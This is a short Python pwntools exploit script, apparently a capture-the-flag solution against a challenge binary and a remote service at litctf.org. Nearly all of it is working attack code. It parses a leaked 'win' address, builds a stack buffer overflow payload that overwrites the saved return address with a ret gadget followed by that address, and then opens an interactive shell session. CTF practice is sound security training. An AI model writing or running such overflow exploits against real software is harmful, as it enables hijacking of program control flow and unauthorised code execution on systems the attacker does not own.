#!/usr/bin/env python3

from pwn import *

exe = ELF('./main',checksec = False)
#libc = ELF('',checksec = False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc = None : proc.sendafter(msg,data) if proc else p.sendafter(msg,data)
sl = lambda data,proc = None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc = None: proc.sendlineafter(msg,data) if proc else p.sendlineafter(msg,data)
sn = lambda num, proc = None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg,num, proc = None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc = None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc = None: proc.sendlineafter(msg,str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode)
def GDB():
	if not args.REMOTE:
		gdb.attach(p, gdbscript = '''
			b*win
			c
		''')
		input()

server = 'litctf.org'
port = 31771

if args.REMOTE:
	if server == '' or port == 0:
		print('Please sign server and port !!')
		exit(1)
	else: p = remote(server,port)
else:
	p = process(exe.path)

GDB()
p.recvuntil(b'to:')
win_addr = int(p.recvline().decode().rstrip().replace(' ',''),16)
payload = b'A'*32 + b'B'*8 + p64(0x00000000004011f4)+ p64(win_addr)
sl(payload)	

p.interactive()

